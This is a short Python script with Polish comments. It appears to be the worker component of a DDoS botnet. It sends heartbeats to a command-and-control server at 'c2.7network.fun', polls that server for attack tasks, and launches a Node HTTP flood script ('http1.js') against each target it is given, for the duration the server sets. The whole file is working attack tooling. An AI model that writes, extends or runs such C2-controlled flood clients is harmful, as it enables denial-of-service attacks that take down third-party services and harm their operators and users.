import requests
import time
import subprocess
import threading

MAIN_VPS = "http://c2.7network.fun:7978"  # <-- wpisz IP main VPS
WORKER_ID = "worker2"  # unikalny dla każdego workera

def send_heartbeat():
    while True:
        try:
            requests.post(f"{MAIN_VPS}/heartbeat", json={"worker_id": WORKER_ID}, timeout=5)
        except Exception as e:
            print("Heartbeat error:", e)
        time.sleep(10)

threading.Thread(target=send_heartbeat, daemon=True).start()

while True:
    try:
        r = requests.get(f"{MAIN_VPS}/api/get_task", params={"worker_id": WORKER_ID})
        data = r.json()
        if data.get("target"):
            target = data["target"]
            t = data["time"]
            # Odpala komendę
            subprocess.Popen(["node", "http1.js", target, "Dupa.txt", t, "10"])
    except Exception as e:
        print("Błąd:", e)
    time.sleep(5)  # co 5 sekund pyta o zadanie 
